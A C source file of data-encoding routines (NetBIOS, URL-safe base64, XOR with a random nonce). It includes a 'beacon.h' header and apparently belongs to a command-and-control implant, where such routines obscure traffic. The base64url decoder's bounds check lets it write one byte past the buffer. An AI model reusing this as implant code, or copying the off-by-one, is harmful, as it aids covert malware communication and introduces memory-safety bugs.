#include <windows.h>
#include "crypto.h" /* P4.15: 不再直接依赖 tomcrypt */
#include "encoders.h"
#include "beacon.h"

int netbios_encode(char base, char * src, int length, char * dst, int maxlength) {
	int hi, low, x, y;
	for (y = 0, x = 0; x < length && y < maxlength; x++, y += 2) {
		hi = (src[x] & 0x000000F0) >> 4;
		low = src[x] & 0x0000000F;

		hi += base;
		low += base;

		dst[y] = hi;
		dst[y + 1] = low;
	}

	return y;
}

int netbios_decode(char base, char * src, int length, char * dst, int maxlength) {
	int i, hi, low;
	char me;

	/* NetBIOS encoded text should *always* be even length */
	if ((length % 2) == 1)
		return 0;

	for (i = 0; i < length && (i / 2) < maxlength; i += 2) {
		hi = src[i];
		low = src[i + 1];

		me = (char)((hi - base) << 4);
		me += (char)(low - base);

		dst[i / 2] = me;
	}

	return length / 2;
}

int base64url_encode(const unsigned char * in, unsigned long len, unsigned char * out, unsigned long *outlen) {
	int status;
	int x;
	unsigned long result_length;

	/* apply base64 encode to our parameters */
	status = crypto_base64_encode(in, len, out, outlen);
	if (status != CRYPTO_OK) {
		return status;
	}

	/* what is our result length? */
	result_length = *outlen;

	/*
	 * transform the results to make them URL safe
	 * 1. remove padding '='
	 * 2. sub / => _
	 * 3. sub + => -
	 */
	for (x = 0; x < *outlen; x++) {
		if (out[x] == '=') {
			out[x] = '\0';
			result_length--;
		}
		else if (out[x] == '/') {
			out[x] = '_';
		}
		else if (out[x] == '+') {
			out[x] = '-';
		}
	}

	/* store the final result_length into outlen */
	*outlen = result_length;

	/* return our status */
	return status;
}

int base64url_decode(unsigned char * in, unsigned long len, unsigned long max, unsigned char * out, unsigned long *outlen) {
	int x;
	char * result;

	/*
	 * transform the input text from URL-safe to standard base64
	 * 1. sub _ => /
	 * 2. sub - => +
 	 * 3. restore padding
 	 */
	for (x = 0; x < len; x++) {
		if (in[x] == '_') {
			in[x] = '/';
		}
		else if (in[x] == '-') {
			in[x] = '+';
		}
	}

	/* restore the padding */
	while ((len % 4) != 0) {
		/* it's C, we should do bounds checking */
		if (len > max) {
			return CRYPTO_BUFFER_OVERFLOW;
		}

		/* OK, we're good, let's stomp on the len by adding more padding */
		in[len]     = '=';
		len++;
	}

	/* do the decode of our (transformed) result */
	return crypto_base64_decode(in, len, out, outlen);
}

int xor_encode(char * src, int length, char * dst, int maxlength) {
	DWORD x, nonce;
	char  * key = dst;

	/* check if maxlength is safe */
	if ((length + sizeof(DWORD)) > maxlength)
		return 0;

	/* assign our nonce */
	nonce = bigger_rand();
	memcpy(dst, (char *)&nonce, sizeof(DWORD));
	dst += sizeof(DWORD);

	/* walk src string, XOR the value, press on */
	for (x = 0; x < length; x++) {
		dst[x] = src[x] ^ key[x % 4];
	}

	/* return our encoded string value, please! */
	return length + sizeof(DWORD);
}

int xor_decode(char * src, int length, char * dst, int maxlength) {
	DWORD x;
	char * key;

	/* sanity check on the length */
	if ((length - sizeof(DWORD)) > maxlength)
		return 0;

	/* populate our key value with whatever */
	key = src;
	src += sizeof(DWORD);
	length -= sizeof(DWORD);

	/* walk src string, XOR the value, press on */
	for (x = 0; x < length; x++) {
		dst[x] = src[x] ^ key[x % 4];
	}

	return length;
}
